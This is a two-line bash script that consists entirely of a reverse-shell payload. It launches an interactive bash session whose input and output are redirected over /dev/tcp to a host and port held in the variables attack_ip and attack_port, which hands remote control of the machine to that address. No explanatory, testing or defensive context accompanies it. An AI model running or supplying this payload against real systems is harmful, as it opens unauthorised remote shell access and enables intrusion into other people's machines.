#! /bin/bash
/bin/bash -i >& /dev/tcp/$attack_ip/$attack_port 0>&1
